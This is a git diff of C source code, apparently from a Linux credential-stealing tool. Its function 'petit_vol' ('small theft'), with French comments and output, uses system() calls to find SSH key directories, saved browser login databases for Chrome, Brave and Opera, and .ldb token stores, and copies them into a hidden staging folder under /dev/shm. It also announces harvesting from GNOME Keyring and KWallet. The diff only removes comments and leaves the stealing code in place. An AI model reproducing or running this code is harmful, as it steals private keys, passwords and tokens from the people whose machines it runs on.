@@ -55,13 +55,8 @@ int petit_vol(void)
     printf("--------------------------------------------\n\n");
     printf(""MAGENTA"RECONNAISSANCE CLES SSH"RESET" "GREEN"(DONNE LEGERE ET PRECIEUSE)\n\n"RESET"");
     printf(CYAN"\n\n"RESET);
-    //pas de mdp root a ce stade faire avec 
     system("find  / -type d -name '*.ssh' -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\;  2>/dev/null");
 
-    //a supprime pour version de "prod" ramenti 
- 
-
-    
     printf(""MAGENTA"RECONNAISSANCE BASE DE DONNEE : Chromium / Google Chrome / Brave / Opera"RESET" "GREEN"(DONNE LEGERE ET PRECIEUSE)\n\n"RESET"");
     printf(CYAN"\n\n"RESET);
     system("find ~ -type f -name 'Login Data' -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\;  2>/dev/null");
@@ -80,7 +75,6 @@ int petit_vol(void)
     printf("\n--------------------------------------------\n\n");
     system("find ~/.config -type f  -name '*.ldb'  -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\; 2>/dev/null");
     printf("\n--------------------------------------------\n\n");
-
 
 
     printf(""MAGENTA"RECONNAISSANCE BASE DE DONNEE : GESTIONAIRE DE CLE : (GNOME Keyring / KWallet)"RESET" "GREEN"(DONNE LEGERE ET PRECIEUSE)\n\n"RESET"");
@@ -112,7 +106,7 @@ int petit_vol(void)
     return 0;
 }
 
-
+//TO COMPILE BASIC_IMAGE
 /*int main (void)
 {
 
